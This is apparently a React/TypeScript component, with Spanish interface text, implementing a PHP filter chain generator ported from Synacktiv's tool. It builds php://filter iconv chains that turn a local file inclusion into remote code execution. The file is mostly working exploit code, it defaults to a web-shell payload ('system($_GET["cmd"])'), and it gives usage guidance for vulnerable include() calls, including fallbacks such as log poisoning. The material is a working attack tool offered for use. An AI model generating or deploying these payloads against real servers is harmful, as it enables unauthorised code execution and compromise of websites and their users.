import { useMemo, useState } from 'react'
import { Filter } from 'lucide-react'
import { ToolHeader, Badge, CopyBtn, CopyBlock, Field, TextInput, Select, Reveal, InfoBanner } from '../components/ui'

/* Algoritmo portado 1:1 de Synacktiv/php_filter_chain_generator (MIT):
   https://github.com/synacktiv/php_filter_chain_generator */
const CONVERSIONS: Record<string, string> = {
  '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
  '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
  '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
  '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
  '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
  '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
  '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
  '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
  '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
  '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
  A: 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
  a: 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
  B: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
  b: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
  C: 'convert.iconv.UTF8.CSISO2022KR',
  c: 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
  D: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
  d: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
  E: 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
  e: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
  F: 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
  f: 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
  g: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
  G: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
  H: 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
  h: 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
  I: 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
  i: 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
  J: 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
  j: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
  K: 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
  k: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
  L: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
  l: 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
  M: 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
  m: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
  N: 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
  n: 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
  O: 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
  o: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
  P: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
  p: 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
  q: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
  Q: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
  R: 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
  r: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
  S: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
  s: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
  T: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
  t: 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
  U: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
  u: 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
  V: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
  v: 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
  W: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
  w: 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
  X: 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
  x: 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
  Y: 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
  y: 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
  Z: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
  z: 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
  '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
  '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
  '=': '',
}

function b64encode(s: string): string {
  // UTF-8 seguro como el b64encode de Python
  const bytes = new TextEncoder().encode(s)
  let bin = ''
  for (const b of bytes) bin += String.fromCharCode(b)
  return btoa(bin)
}

function generateChain(base64: string, debug = false): string {
  let filters = 'convert.iconv.UTF8.CSISO2022KR|'
  filters += 'convert.base64-encode|'
  filters += 'convert.iconv.UTF8.UTF7|'
  for (const c of [...base64].reverse()) filters += (CONVERSIONS[c] ?? '') + '|'
  filters += 'convert.base64-decode|'
  filters += 'convert.base64-encode|'
  filters += 'convert.iconv.UTF8.UTF7|'
  if (!debug) filters += 'convert.base64-decode'
  return `php://filter/${filters}/resource=php://temp`
}

export default function Phpfilter() {
  const [code, setCode] = useState('<?php system($_GET["cmd"]); ?>')
  const [mode, setMode] = useState<'chain' | 'rawb64'>('chain')
  const [rawB64, setRawB64] = useState('PD9waHAgcGhwaW5mbygpOwo')

  const result = useMemo(() => {
    try {
      if (mode === 'rawb64') {
        const clean = rawB64.replace(/=/g, '')
        if (!/^[A-Za-z0-9+/]*$/.test(clean)) return { chain: '', b64: clean, err: 'solo caracteres base64 válidos' }
        return { chain: generateChain(clean, true), b64: clean, err: '' }
      }
      if (!code.trim()) return { chain: '', b64: '', err: 'escribe el código PHP' }
      const b64 = b64encode(code).replace(/=/g, '')
      return { chain: generateChain(b64), b64, err: '' }
    } catch {
      return { chain: '', b64: '', err: 'error generando la cadena' }
    }
  }, [code, mode, rawB64])

  const usage = `# include($_GET['file']) con este valor ejecutaría:\n# ${code || 'código PHP elegido'}\ninclude '${result.chain}';`

  return (
    <>
      <ToolHeader icon={Filter} title="PHP Filter Chain Generator" desc="Convierte LFI en RCE sin subir ningún fichero: genera cadenas php://filter con iconv que SINTETIZAN tu código PHP en memoria — portado del generador oficial de Synacktiv" />

      <InfoBanner>
        <b>La magia:</b> cada filtro iconv altera los bytes del stream; encadenándolos se fabrica CUALQUIER contenido base64.
        Si la app hace <span className="font-mono">include($_GET['file'])</span>, no necesitas subir ficheros ni logs:
        el payload ES el fichero. Requiere PHP con filtros convert.iconv activos (default en casi todos).
      </InfoBanner>

      <div className="grid gap-4 lg:grid-cols-2">
        <div className="space-y-3">
          <Field label="Modo">
            <Select value={mode} onChange={(e) => setMode(e.target.value as 'chain' | 'rawb64')} options={[{ value: 'chain', label: 'código PHP → cadena completa' }, { value: 'rawb64', label: 'base64 ya calculado (debug)' }]} />
          </Field>

          {mode === 'chain' ? (
            <Field label="Código PHP a sintetizar">
              <textarea value={code} onChange={(e) => setCode(e.target.value)} rows={4} className="w-full rounded border border-white/10 bg-black/40 px-2 py-1.5 font-mono text-xs text-ok" />
              <p className="mt-1 text-[11px] text-grey/70">Si el include imprime el contenido en HTML, el código se ejecuta al abrir la página. Añade espacios finales si el payload se corta.</p>
            </Field>
          ) : (
            <Field label="Base64 crudo (sin =)">
              <TextInput value={rawB64} onChange={(e) => setRawB64(e.target.value)} className="font-mono" />
            </Field>
          )}

          {result.err && <div className="rounded border border-bad/40 bg-bad/5 px-3 py-2 text-xs text-bad">{result.err}</div>}

          <div className="rounded border border-edge bg-black/30 p-3">
            <h4 className="mb-1.5 text-[10px] font-semibold uppercase tracking-wider text-acento">Dónde encaja</h4>
            <ul className="space-y-1.5 text-[11px] text-grey">
              <li>• <span className="font-mono text-ink">LFI clásico:</span> include($_GET['file']) sin validación → RCE directo</li>
              <li>• <span className="font-mono text-ink">include con sufijo:</span> include($f . '.php') funciona igual (la cadena termina en temp)</li>
              <li>• <span className="font-mono text-ink">con filtros bloqueados:</span> si bloquean php://filter, prueba data:// o log poisoning (ver Payloads)</li>
              <li>• <span className="font-mono text-ink">CSP/allow_url_include:</span> no aplican — la cadena usa wrappers locales</li>
            </ul>
          </div>
        </div>

        <div className="space-y-3">
          {!result.err && result.chain && (
            <Reveal>
              <div className="rounded-lg border border-ok/40 bg-ok/5 p-3">
                <div className="mb-1.5 flex items-center justify-between">
                  <Badge tone="ok">cadena generada · base64: {result.b64.length} chars</Badge>
                  <CopyBtn text={result.chain} label="Copiar payload" />
                </div>
                <CopyBlock text={result.chain} label="payload php://filter" maxH="14rem" />
                <div className="mt-2"><CopyBlock text={usage} label="uso en la LFI" maxH="10rem" /></div>
              </div>
            </Reveal>
          )}
          <div className="rounded border border-edge bg-black/30 p-3">
            <h4 className="mb-1.5 text-[10px] font-semibold uppercase tracking-wider text-acento">Créditos y referencias</h4>
            <ul className="space-y-1 text-[11px] text-grey">
              <li>• Algoritmo: <a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank" rel="noreferrer" className="text-acento underline">Synacktiv (MIT)</a> — portado a TS sin dependencias</li>
              <li>• Idea original: <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank" rel="noreferrer" className="text-acento underline">loknop gist</a> · <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT" target="_blank" rel="noreferrer" className="text-acento underline">wupco dict</a></li>
              <li>• Documentación: <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters" target="_blank" rel="noreferrer" className="text-acento underline">HackTricks LFI2RCE</a></li>
            </ul>
          </div>
        </div>
      </div>
    </>
  )
}
